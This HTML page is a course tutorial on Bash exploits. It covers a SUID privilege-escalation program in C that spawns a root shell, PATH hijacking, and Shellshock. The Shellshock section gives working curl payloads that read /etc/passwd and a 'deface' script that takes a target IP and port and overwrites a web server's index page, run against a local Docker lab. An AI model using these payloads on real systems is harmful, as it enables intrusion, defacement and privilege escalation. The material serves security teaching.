<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1.0, shrink-to-fit=no">
<link href="assets/images/logo.png" rel="icon" />
<title>Jan Zbořil | Bash Exploits</title>
<meta name="description" content="Your ThemeForest item Name and description">
<meta name="author" content="harnishdesign.net">
<meta http-equiv='cache-control' content='no-cache'> 
<meta http-equiv='expires' content='0'> 
<meta http-equiv='pragma' content='no-cache'>

<!-- Stylesheet
============================== -->
<!-- Bootstrap -->
<link rel="stylesheet" type="text/css" href="assets/vendor/bootstrap/css/bootstrap.min.css" />
<!-- Font Awesome Icon -->
<link rel="stylesheet" type="text/css" href="assets/vendor/font-awesome/css/all.min.css" />
<!-- Magnific Popup -->
<link rel="stylesheet" type="text/css" href="assets/vendor/magnific-popup/magnific-popup.min.css" />
<!-- Highlight Syntax -->
<link rel="stylesheet" type="text/css" href="assets/vendor/highlight.js/styles/github.css" />
<!-- Custom Stylesheet -->
<link rel="stylesheet" type="text/css" href="assets/css/stylesheet.css" />
<link rel="stylesheet" type="text/css" href="assets/css/color-cyan.css" />
</head>

<body data-spy="scroll" data-target=".idocs-navigation" data-offset="125">

<!-- Preloader -->
<div class="preloader">
  <div class="lds-ellipsis">
    <div></div>
    <div></div>
    <div></div>
    <div></div>
  </div>
</div>
<!-- Preloader End --> 

<!-- Document Wrapper   
=============================== -->
<div id="main-wrapper"> 
  
  <!-- Header
  ============================ -->
  <header id="header" class="sticky-top"> 
    <!-- Navbar -->
    <nav class="primary-menu navbar navbar-expand-lg navbar-dropdown-dark bg-dark navbar-text-light">
      <div class="container-fluid">
        <!-- Sidebar Toggler -->
		<button id="sidebarCollapse" class="navbar-toggler d-block d-md-none" type="button"><span></span><span class="w-75"></span><span class="w-50"></span></button>
		
		<!-- Logo --> 
        <a class="logo ml-md-3" href="index.html" title="RollLikeRollo"> <img src="assets/images/VUT-FIT-logo-en.png" height="50" alt="RollLikeRollo"/> </a> 
		<span class="text-2 ml-2"></span> 
        <!-- Logo End -->
        
		<!-- Navbar Toggler -->
		<button class="navbar-toggler ml-auto" type="button" data-toggle="collapse" data-target="#header-nav"><span></span><span></span><span></span></button>
        
		<div id="header-nav" class="collapse navbar-collapse justify-content-end">
          <ul class="navbar-nav">
            <!-- <li class="dropdown"> <a class="dropdown-toggle" href="#">Dropdown</a>
              <ul class="dropdown-menu">
                <li><a class="dropdown-item" href="#">Action</a></li>
                <li class="dropdown"><a class="dropdown-item dropdown-toggle" href="#">Dropdown Action</a>
                  <ul class="dropdown-menu">
                    <li><a class="dropdown-item" href="index.html">Action</a></li>
                    <li><a class="dropdown-item" href="feature-header-dark.html">Another Action</a></li>
                    <li><a class="dropdown-item" href="feature-header-primary.html">Something Else Here</a></li>
                    <li><a class="dropdown-item" href="index-2.html">Another Link</a></li>
                  </ul>
                </li>
                <li><a class="dropdown-item" href="#">Another Action</a>
                <li><a class="dropdown-item" href="#">Something Else Here</a></li>
              </ul>
            </li> -->
            <li><a target="_self" href="index.html">Main Page</a></li>
            <!-- <li><a target="_blank" href="https://themeforest.net/user/harnishdesign/#contact?ref=HarnishDesign">Support</a></li> -->
          </ul>
        </div>
        <ul class="social-icons social-icons-sm ml-lg-2 mr-2">
          <!-- <li class="social-icons-twitter"><a data-toggle="tooltip" href="http://www.twitter.com/harnishdesign/" target="_blank" title="" data-original-title="Twitter"><i class="fab fa-twitter"></i></a></li> -->
          <!-- <li class="social-icons-facebook"><a data-toggle="tooltip" href="http://www.facebook.com/harnishdesign/" target="_blank" title="" data-original-title="Facebook"><i class="fab fa-facebook-f"></i></a></li> -->
          <!-- <li class="social-icons-dribbble"><a data-toggle="tooltip" href="http://www.dribbble.com/harnishdesign/" target="_blank" title="" data-original-title="Dribbble"><i class="fab fa-dribbble"></i></a></li> -->
          <li class="social-icons-dribbble"><a data-toggle="tooltip" href="https://github.com/RollLikeRollo/" target="_blank" title="" data-original-title="Github"><i class="fab fa-github"></i></a></li>
          <li class="social-icons-dribbble"><a data-toggle="tooltip" href="https://www.linkedin.com/in/janzboril/" target="_blank" title="" data-original-title="Linkedin"><i class="fab fa-linkedin-in""></i></a></li>
        </ul>
      </div>
    </nav>
    <!-- Navbar End --> 
  </header>
  <!-- Header End --> 
  
  <!-- Content
  ============================ -->
  <div id="content" role="main">
    
	<!-- Sidebar Navigation
	============================ -->
	<div class="idocs-navigation bg-light">
      <ul class="nav flex-column ">
        <li class="nav-item"><a class="nav-link active" href="#sco_bash">SCO - Bash</a>
          <ul class="nav flex-column">
            <li class="nav-item"><a class="nav-link" href="#intro_bash">Introduction</a></li>
            <li class="nav-item"><a class="nav-link" href="#suid">SUID bit exploit</a></li>
            <li class="nav-item"><a class="nav-link" href="#enviroment">Environmental Variables</a></li>
            <li class="nav-item"><a class="nav-link" href="#shellshock">Shellshock</a></li>
          </ul>
      </ul>
    </div>
    
    <!-- Docs Content
	============================ -->
    <div class="idocs-content">

      <div >
        <h1 id="sco_bash">SCO - Bash</h1>
        <h2 id="intro_bash"> Introduction</h2>
        <p>This webpage is collection of simple tutorials for running exploits in Bash.</p>
        <p>All examples are modified projects/programs/snippets of code collected from the Internet. 
          Source is noted for each example. You can donwload the example repository
        forom <a target="_blank" href="https://github.com/RollLikeRollo/SCO_shell_scripting">Github repository</a></p>

        <h2 id="suid">SUID bit exploit</h2>

        <p class="lead"><a target="_blank" href="https://github.com/RollLikeRollo/SCO_shell_scripting/tree/main/environment_var">Github repository directory with the example</a></p>
        <p >The SUID (Set User ID) bit is a special permission that can be set on a file in Linux. When a file has the SUID bit set, it will run with the permissions of the file's owner instead of the user who ran the file. This can be used to escalate privileges.</p>
        <p> Privilege escalation is demonstrated on following example:        </p>


        <div>
          <p> Let's assume, that compiled <code>get_root.c</code> has the SUID bit set. Then, when the program is run, it sets IDs to variables using functions
          <code>getuid()</code> and <code>geteuid()</code> Then on lines 18 and 19, the root user is is set as the user, who originally executed the program. Now, new processes
        can be opend from this program, each of them running as root user. This fact is xploited on line 22, where program <code>get_in.sh</code> is executed. In this case,
      <code>get_in.sh</code> open new terminal as root. </p>
        </div>

        <div class="accordion" id="accordionD1">
          <div class="card">
            <div class="card-header" id="headingTwo">
              <h5 class="mb-0"> <a href="#" data-toggle="collapse" data-target="#collapseTwo" aria-expanded="true" aria-controls="collapseTwo">get_in.sh</a> </h5>
            </div>
            <div id="collapseTwo" class="collapse show" aria-labelledby="headingTwo" data-parent="#accordionD1">
              <div class="card-body">  
                <pre><code class="bash">
/bin/bash -i
                </code></pre>
              </div>
            </div>  
          </div>

        <div class="accordion" id="accordionDefault">
          <div class="card">
            <div class="card-header" id="headingOne">
              <h5 class="mb-0"> <a href="#" data-toggle="collapse" data-target="#collapseOne" aria-expanded="true" aria-controls="collapseOne">get_root.c</a> </h5>
            </div>
            <div id="collapseOne" class="collapse show" aria-labelledby="headingOne" data-parent="#accordionDefault">
              <div class="card-body">  <pre><code class="c">
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void) {
// store the uids
uid_t ruid = getuid();
uid_t euid = geteuid();
// store the gids
gid_t rgid = getgid();
gid_t egid = getegid();
              
printf("Before execution UID: %d and EUID: %d\n", ruid, euid);
printf("Before execution GID: %d and EGID: %d\n", rgid, egid);
              
// elevate the privileges
setuid(euid);
setgid(egid);
              
// perform action
system("/bin/bash get_in.sh");
              
// drop privileges
if (setuid(ruid)) {
  fprintf(stderr, "Drop user privileges setuid(%d) failed!\n", ruid);
}
if (setgid(rgid)) {
  fprintf(stderr, "Drop group privileges setgid(%d) failed!\n", rgid);
}
              
printf("After execution UID: %d and EUID: %d\n", getuid(), geteuid());
printf("After execution GID: %d and EGID: %d\n", getgid(), getegid());
printf("Completed! Check output in /tmp/output\n");
return 0;
}
                    </code></pre></div>
            </div>
          </div>
        </div>

        



        </section>

        <div>
          <p>
            Because it is needed to be root in order to set the SUID bit, attacker does not create new programs, but he searches for vulnerable programs on the system.
            These can be found using:
          </p>
        </div>
        <div class="accordion" id="accordionfindvul">
          <div class="card">
            <div class="card-header" id="headingThree">
              <h5 class="mb-0"> <a href="#" data-toggle="collapse" data-target="#collapseThree" aria-expanded="true" aria-controls="collapseThree">find SUID bit programs in system</a> </h5>
            </div>
            <div id="collapseThree" class="collapse show" aria-labelledby="headingThree" data-parent="#accordionfindvul">
              <div class="card-body">  
                <pre><code class="bash">
find / -type f -perm -4001 -exec 
ls -h {} \; 2 > /dev/null
                </code></pre>
              </div>
            </div>  
          </div>
        </div>
        <div>
          <p>
            When any of these found programs is not coded securly, and contains dangerous call of system function (for example: <code>system(ls)</code> místo system(/bin/ls)</code>,
             it can be exploited using environmental variables - more on that in <a class="" href="#enviroment">next chapter</a>.
          </p>
        </div>
      </div>
      <h2 id="enviroment"> Environmental Variables</h2>
      <p>
        Environmental variables are variables in the environment of the running process. 
        Because they are set for the entire environment in which individual processes run, processes use these variables for their activity.
      </p>
      <p>
        If the PATH variable is overwritten (by a program or a user) in the running shell process, then it can substitute its own code for another, legitimate and similarly named program.
        A program or user with administrator rights can then unwittingly start an attacker's code.
        This can happen in two cases:
        <ol>
          <li>Suppose there is a situation where the currently open directory is added to the PATH variable (by the command <code>export PATH = .: $ PATH</code>).
            If there is a program with the name <code>ping</code> in the current open folder, and the user writes ping to the command line, the malicious code will be executed.
            To start the legitimate instance of <code>ping</code>, it must be started as <code>/bin/ping</code>. </li>
            <li>Suppose there is a situation where the currently open directory is added to the PATH variable (by the command <code>export PATH = .: $ PATH</code>).
              If there is a program with the name <code>ping</code> in the current open folder, and a program with the SUID flag set is started, whose owner is root, and which calls <code>system(ping)</code>,
               the attacker's program is executed with root privileges.
            Therefore, it is important to be carefull when opening new processes in programs with the SUID flag set.</li>
        </ol> 
        The situation looks like this in the terminal:
      </p>
      <div class="accordion" id="accordion4">
        <div class="card">
          <div class="card-header" id="heading4">
            <h5 class="mb-0"> <a href="#" data-toggle="collapse" data-target="#collapse4" aria-expanded="true" aria-controls="collapse4">Terminal example</a> </h5>
          </div>
          <div id="collapse4" class="collapse show" aria-labelledby="heading4" data-parent="#accordion4">
            <div class="card-body">  
              <pre><code class="bash">
$ ping 1.1.1.1
PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.
64 bytes from 1.1.1.1
64 bytes from 1.1.1.1
.
.
.
$ export PATH=.:$PATH
$ ping 1.1.1.1
I am a virus!!!!!
              </code></pre>
            </div>
          </div>  
        </div>
        <div>
          <h2 id="shellshock">Shellshock</h2>
          <p>
            Shellshock is a vulnerability in the Bash shell that allows an attacker to execute arbitrary commands on a vulnerable system.
             It was discovered in September 2014. It was then applicable to all versions of Bash from 1.14.7 to 4.3. 
             Shellshock is decribed in detail in the NIST databse in the <a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6271">CVE-2014-6271</a> and <a href="CVE-2014-
             7169">CVE-2014-7169</a> entries.
          </p>

          <p>
            The idea behind Shellshock is to use the environment variables to execute malicious code. If there is an unsanitised user input, an  
            attacker can use it to overwrite the environment variables. This overwritten variable will then contain the malicious code in a form of a string.
            That code is not the main part of the attcak though, because string in environmental variable is never executed. However, if the string begins
            with <code>(){ :;}</code>, then it is executed as a function. This is the Shellshock in a nutshell.
          </p>
          <p>
            Watch this excellend video about Shellshock by Tom Scott: <a href="https://www.youtube.com/watch?v=aKShnpOXqn0">https://www.youtube.com/watch?v=aKShnpOXqn0</a>
          </p>

          <p>
            In <a href="https://github.com/RollLikeRollo/SCO_shell_scripting/tree/main/shellshock/bash-4.3">https://github.com/RollLikeRollo/SCO_shell_scripting/tree/main/shellshock/bash-4.3</a>
             you can find a vulnerable version of Bash. You can test the vulnerability by running the testing script <code>./run.sh</code>. This will open the old vulnerable Bash shell.
            Try running following command in Bash 4.3: <code>env x='() { :;}; echo vulnerable' bash -c "echo this is a test"</code>
          </p>

          <h3>Example exploit by opsxcq</h3>
            Repository with the example: <a href="https://github.com/opsxcq/exploit-CVE-2014-6271">https://github.com/opsxcq/exploit-CVE-2014-6271</a>

            <p>
              In this example, the attacker uses the vulnerable file on web server to revrite contents of a webpage.
            </p>
            <p>
              This example contains docker container running a web server and a vulnerable Bash shell. The web server is running on <code>localhost</code>, port <code>8080</code>.
              In order to setup and run the container, run the <code>run_docker.sh</code> script in a new terminal as root (use <code>sudo</code>, for example). The script has 
              to be kept open and running for the entire duration of the experiment. Because the enviroment is a docker container, the experiment can be indefinitely repeated.
              Just restart the container.
            </p>
            <p>
              Open a web browser and go to <code><a target=”_blank” href="http://localhost:8080/">http://localhost:8080/</a></code>. You should see a vulnerable webpage which
              looks like thhe one on image below.
              <img src="assets/images/normal.png" class="img-fluid" alt="Webpage" style="border: 1px solid rgb(0, 159, 180);">
            </p>
            <p>
              In terminal, run <code>run_simple_exploit.sh</code>. It contains the following code: 
              

                  <div class="accordion" id="accordion5">
                    <div class="card">
                      <div class="card-header" id="heading5">
                        <h5 class="mb-0"> <a href="#" data-toggle="collapse" data-target="#collapse5" aria-expanded="true" aria-controls="collapse4">run_simple_exploit.sh</a> </h5>
                      </div>
                      <div id="collapse5" class="collapse show" aria-labelledby="heading5" data-parent="#accordion5">
                        <div class="card-body">  
                          <pre><code class="bash">
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://localhost:8080/cgi-bin/vulnerable
                          </code></pre>
                        </div>
                      </div>  
                    </div>
                  </div>
              
              This <code>curl</code> utility uses the -H switch. This switch manually sets the HTTP header. The header is set to the value of the user-agent environmental variable,
              to which is the malicious code injected. This code should output the contents of the <code>/etc/passwd</code> file of the web server machine, our docker container, in our case.

            </p>
            <p>
              If the previous step was successful, you can continue to the next step. In the terminal, run <code>exploit-deface.sh</code>. It contains the following code:
              
                  <div class="accordion" id="accordion6">
                    <div class="card">
                      <div class="card-header" id="heading6">
                        <h5 class="mb-0"> <a href="#" data-toggle="collapse" data-target="#collapse6" aria-expanded="true" aria-controls="collapse4">exploit-deface.sh</a> </h5>
                      </div>
                      <div id="collapse6" class="collapse show" aria-labelledby="heading6" data-parent="#accordion6">
                        <div class="card-body">  
                          <pre><code class="bash">
if [ -z "$1" ]
then
    echo 'Please inform the IP and PORT of the target'
    echo 'Example: ./exploit-deface.sh <ip> <port>'
    return -1
fi

ip=$1
port=$2

echo '[+] Sending the exploit'
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"&lt;html&gt;&lt;body&gt;&lt;h1&gt;DEFACED&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;\" > /var/www/index.html'" http://$ip:$port/cgi-bin/vulnerable && \
echo '[+] Target exploited, testing if defacement page is deployed' && \
curl http://$ip:$port
echo '[+] Done'                            
                          </code></pre>
                        </div>
                      </div>  
                    </div>
                  </div>
                
                Run the <code>exploit-deface.sh</code> with the IP address and port of the web server in the arguments. In our case, the IP address is <code>localhost</code> or <code>172.17.0.2</code> and the port is <code>8080</code>.
            </p>

            <p>
              Reload the webpage in the browser. You should see the defaced page. Was the attack successful?
            </p>
            <p>
              The page should look like this now:
            </p>
              <img src="assets/images/exploited.png" class="img-fluid" alt="Expoited web page" style="border: 1px solid rgb(0, 159, 180);">
            

        </div>

      </div>
    </div> 
  </div>
  <!-- Content end --> 

  
  
  <!-- Footer
  ============================ -->
  <footer id="footer" class="section bg-dark footer-text-light">
    <div class="container">
      <ul class="social-icons social-icons-lg social-icons-muted justify-content-center mb-3">
        <!-- <li><a data-toggle="tooltip" href="https://twitter.com/harnishdesign/" target="_blank" title="" data-original-title="Twitter"><i class="fab fa-twitter"></i></a></li> -->
        <!-- <li><a data-toggle="tooltip" href="http://www.facebook.com/harnishdesign/" target="_blank" title="" data-original-title="Facebook"><i class="fab fa-facebook-f"></i></a></li> -->
        <!-- <li><a data-toggle="tooltip" href="http://www.dribbble.com/harnishdesign/" target="_blank" title="" data-original-title="Dribbble"><i class="fab fa-dribbble"></i></a></li> -->
        <li><a data-toggle="tooltip" href="https://github.com/RollLikeRollo/" target="_blank" title="" data-original-title="GitHub"><i class="fab fa-github"></i></a></li>
        <li><a data-toggle="tooltip" href="https://www.linkedin.com/in/janzboril/" target="_blank" title="" data-original-title="LinkedIn"><i class="fab fa-linkedin-in"></i></a></li>
      </ul>
      <p class="text-center">© 2022 Jan Zbořil</p>
    <p class="text-2 text-center mb-0">Copyright &copy; 2020 <a href="http://www.harnishdesign.net/idocs-one-page-documentation-html-template/">iDocs</a>. All Rights Reserved.</p>
	  <p class="text-2 text-center mb-0">Design &amp; Develop by <a class="btn-link" target="_blank" href="http://www.harnishdesign.net/">HarnishDesign</a>.</p>
    </div>
  </footer>
  <!-- Footer end -->
  
</div>
<!-- Document Wrapper end --> 

<!-- Back To Top --> 
<a id="back-to-top" data-toggle="tooltip" title="Back to Top" href="javascript:void(0)"><i class="fa fa-chevron-up"></i></a> 

<!-- JavaScript
============================ -->
<script src="assets/vendor/jquery/jquery.min.js"></script> 
<script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script> 
<!-- Highlight JS -->
<script src="assets/vendor/highlight.js/highlight.min.js"></script> 
<!-- Easing --> 
<script src="assets/vendor/jquery.easing/jquery.easing.min.js"></script> 
<!-- Magnific Popup --> 
<script src="assets/vendor/magnific-popup/jquery.magnific-popup.min.js"></script> 
<!-- Custom Script -->
<script src="assets/js/theme.js"></script>
</body>
</html>
